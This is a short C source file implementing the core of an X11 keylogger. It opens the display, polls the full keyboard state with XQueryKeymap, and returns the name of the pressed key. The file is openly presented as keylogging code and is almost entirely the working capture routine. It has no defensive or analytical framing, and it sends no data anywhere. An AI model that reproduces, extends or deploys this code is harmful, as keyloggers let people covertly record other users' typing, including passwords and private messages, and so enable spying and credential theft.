#include "keylogger.h"

#include <X11/Xlib.h>

#ifndef NULL
#define NULL 0
#endif

#define ReturnNull(v) if(!v) return 0
#define ReturnNotNull(v) if(v) return 0

static Display* __display = NULL;

unsigned int __init_kelogger (const char* denv)
{
  ReturnNotNull(__display);
  XInitThreads();
  __display = XOpenDisplay(denv);
  ReturnNull(__display);
  return 1;
}

unsigned int __destroy_kelogger ()
{
  ReturnNull(__display);
  return XCloseDisplay(__display) == 0? 1: 0;
}

char* __start_reading_input ()
{
  ReturnNull(__display);

  char keys[32];
  KeySym keysym = -1;

  XQueryKeymap(__display, keys);

  for (int i = 0; i < 32; i++)
  {
    for(int j = 0; j < 8; j++)
    {
      // check if any key was pressed
      if(keys[i]&(1<<j))
      {
        int _;
        KeySym *tmp_keysym = XGetKeyboardMapping(__display, i * 8 + j, 1, &_);
        keysym = (*tmp_keysym);
        XFree(tmp_keysym);
      }
    }
  }

  return XKeysymToString(keysym);
}
